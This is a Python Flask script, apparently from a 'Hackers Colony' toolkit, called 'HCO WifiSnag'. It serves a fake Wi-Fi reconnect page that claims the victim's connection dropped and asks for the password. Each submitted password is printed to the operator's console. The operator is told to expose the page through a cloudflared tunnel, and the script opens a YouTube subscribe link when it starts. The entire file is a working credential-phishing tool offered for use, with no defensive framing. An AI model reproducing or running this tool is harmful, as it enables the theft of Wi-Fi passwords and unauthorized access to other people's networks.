from flask import Flask, request, render_template_string
import os
import time

app = Flask(__name__)

def redirect_to_youtube():
    os.system("clear")
    banner = '''
\033[1;32m╭──────────────────────────────────────────────────────────╮
│                                                          │
│        \033[1;31mHCO WifiSnag\033[1;32m - WiFi Credential Capture Tool        │
│                                                          │
│   \033[1;33m[!] This tool is not free. Subscribe to continue.         \033[1;32m│
│   \033[1;36m[>] Redirecting to Hackers Colony YouTube...              \033[1;32m│
│                                                          │
╰──────────────────────────────────────────────────────────╯
'''
    print(banner)
    time.sleep(10)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("\n\033[1;32m[✔] After subscribing, press Enter to continue...\033[0m\n")

# HTML login page (realistic look)
login_page = '''
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .box {
            background-color: #111;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 15px limegreen;
            text-align: center;
            width: 90%;
            max-width: 350px;
        }
        input {
            padding: 12px;
            width: 100%;
            margin: 15px 0;
            border: none;
            border-radius: 6px;
            font-size: 16px;
        }
        button {
            padding: 12px 25px;
            background-color: crimson;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }
        h2 {
            margin-bottom: 10px;
            color: red;
        }
        p {
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>HCO WifiSnag</h2>
        <p>Your WiFi was disconnected.<br>Please enter your password again.</p>
        <form method="POST" action="/login">
            <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
            <button type="submit">Reconnect</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(login_page)

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password')

    print(f"\n\033[1;36m[📶] Captured Wi-Fi Password:\033[0m \033[1;31m{password}\033[0m\n")

    return '''
    <script>alert("Reconnecting...");</script>
    <h2 style="text-align:center; color:white; background:black; padding:30px;">
    Thank you! Reconnecting to Wi-Fi...
    </h2>
    '''

if __name__ == '__main__':
    redirect_to_youtube()
    print("\n\033[1;32m[✔] Flask server running on http://127.0.0.1:5000\033[0m")
    print("\033[1;34m[>] Open a new tab and run:\033[0m")
    print("\033[1;36m    cloudflared tunnel --url http://127.0.0.1:5000\033[0m\n")
    app.run(host='127.0.0.1', port=5000)
